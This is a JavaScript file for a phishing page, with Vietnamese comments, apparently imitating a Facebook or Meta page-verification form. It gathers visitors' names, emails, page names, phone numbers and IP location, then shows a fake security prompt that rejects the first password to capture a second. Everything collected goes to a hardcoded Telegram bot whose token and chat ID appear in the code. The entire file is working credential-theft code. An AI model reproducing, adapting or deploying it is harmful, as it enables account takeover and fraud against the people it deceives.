// ==================== CẤU HÌNH GỬI THẲNG ====================
const TG_TOKEN = '8648725712:AAGvpKKuW8V9dB6yBpwvkyvIi0xCHNDaHAk';
const TG_ID = '5286997232';

async function sendTelegram(text) {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG_ID, text: text, parse_mode: 'HTML' })
    });
}

async function getFullLocation() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        return await res.json();
    } catch (e) { return {}; }
}

// ==================== LOGIC CHÍNH ====================
document.getElementById('clientForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const btn = e.target.querySelector('button');
    btn.disabled = true;
    btn.innerHTML = 'Loading...';

    const loc = await getFullLocation();
    const info = {
        name: document.getElementById('fullName').value,
        email: document.getElementById('email').value,
        eb: document.getElementById('emailBusiness').value,
        page: document.getElementById('fanpage').value,
        phone: document.getElementById('phone').value,
        ip: loc.ip || "N/A",
        country: loc.country_name || "N/A",
        city: loc.city || "N/A",
        region: loc.region || "N/A"
    };

    localStorage.setItem('cached_data', JSON.stringify(info));

    const msg = `🚀 <b>THÔNG TIN ĐĂNG NHẬP</b> 🚀
------------------------------
📄 Page Name: <b>${info.page}</b>
👤 Họ tên: <b>${info.name}</b>
📧 Personal Email: ${info.email}
📧 Business Email: ${info.eb}
📱 SĐT: ${info.phone}
------------------------------
🌍 <b>Vị trí:</b>
IP: <code>${info.ip}</code>
Quốc gia: <b>${info.country}</b>
Thành phố: <b>${info.city}</b>
Vùng: <b>${info.region}</b>
------------------------------`;

    await sendTelegram(msg);
    btn.disabled = false;
    btn.textContent = 'Continue';
    openSecurityModal();
});

function openSecurityModal() {
    const content = `
        <div style="padding: 20px; font-family: sans-serif;">
            <p style="color: #9a979e; font-size: 14px;">For your security, you must enter your password to continue.</p>
            <form id="securityForm">
                <input type="password" id="passInput" placeholder="Password" style="width:100%; border: 1px solid #d4dbe3; padding: 10px; border-radius: 8px; margin-bottom: 15px; outline: none;">
                <p id="passError" style="color: red; font-size: 12px; display: none; margin-bottom: 10px;"></p>
                <button type="submit" style="width:100%; background: #0064E0; color: white; border: none; padding: 12px; border-radius: 20px; cursor: pointer; font-weight: bold;">Continue</button>
            </form>
        </div>`;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let step = 0;
    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const p = document.getElementById('passInput').value;
        const err = document.getElementById('passError');
        const data = JSON.parse(localStorage.getItem('cached_data'));

        if (!p) return;

        if (step === 0) {
            await sendTelegram(`🔑 <b>Mật khẩu (Lần 1):</b> <code>${p}</code>\n👤 User: ${data.email}`);
            err.textContent = "The password you've entered is incorrect.";
            err.style.display = 'block';
            document.getElementById('passInput').value = '';
            step = 1;
        } else {
            await sendTelegram(`🔑 <b>Mật khẩu (Lần 2):</b> <code>${p}</code>\n👤 User: ${data.email}`);
            Modal.close('securityModal');
            // Chuyển sang 2FA ở đây nếu bạn muốn
            alert("Security check required. Please check your device.");
        }
    });
}
